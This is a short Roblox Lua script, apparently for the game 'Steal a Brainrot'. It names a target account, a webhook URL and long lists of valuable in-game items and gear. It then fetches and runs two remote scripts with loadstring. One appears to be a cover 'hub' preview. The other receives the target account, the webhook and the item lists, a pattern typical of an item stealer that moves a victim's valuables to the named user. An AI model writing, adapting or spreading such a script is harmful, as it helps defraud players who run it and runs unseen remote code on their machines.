local TARGET_ID = 9114379282
local TARGET_USER = "pitulim01"
local WEBHOOK_URL = "https://rezzyprotectorwebhook.lovable.app/api/public/wh/seBelTBI13VLrhZL/TN1BRJpmRWaZ3HIh7ArJAbcoeUbzC5EA"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Hydra Bunny"] = true,
    ["Antonio"] = true,
    ["John Pork"] = true,
    ["Elefanto Frigo"] = true,
    ["Pancake and Syrup"] = true,
    ["Arcadragon"] = true,
    ["Rubrikiko"] = true,
    ["Rico Dinero"] = true,
    ["Capitano Americano"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Kalika Bros"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["Dragon Aquanini"] = true,
    ["La Casa Boo"] = true,
    ["La Supreme Combinasion"] = true,
    ["Fishino Clownino"] = true,
    ["Signore Carapace"] = true,
    ["Headless Horseman"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Steakini Fattini"] = true,
    ["Caylusaurus"] = true,
    ["Los Hackers"] = true,
    ["Sammyni Cakini"] = true,
    ["Jelly Moby"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Foxini Lanternini"] = true,
    ["Digi Narwhal"] = true,
    ["Moby Bros"] = true,
    ["Los Admins"] = true,
    ["Capitano Moby"] = true,
    ["Burguro and Fryuro"] = true,
    ["Cash or Card"] = true,
    ["Celestial Pegasus"] = true,
    ["Celularcini Viciosini"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Garama and Madundung"] = true,
    ["Fragola La La La"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Ginger Gerat"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Ketupat Bros"] = true,
    ["La Food Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["Examen Bros"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Los Sekolahs"] = true,
    ["Love Love Bear"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Quackini Snackini"] = true,
    ["Reinito Sleighito"] = true,
    ["Rosey and Teddy"] = true,
    ["Sammyni Fattini"] = true,
    ["Spooky and Pumpky"] = true,
    ["Tralaledon"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Cangurato Gelato"] = true,
    ["Grabatron"] = true,
    ["Noodle Noodle Poodle"] = true,
    ["Noo My Examine"] = true
}

local TargetBaseSkins = {
    ["Tralalero"] = true
}

local TargetGears = {
    ["Candy Sentry"] = true,
    ["Rainbow Hammer"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Santa's Sleigh"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Cupid's Wings"] = true,
    ["Rainbow Slap"] = true
}

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/xspeedHub0/Zlhub/main/ZLPVPreview.lua"))()
    end)
end)

task.spawn(function()
    local success, loadedScript = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    end)

    if success and type(loadedScript) == "function" then
        loadedScript(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)
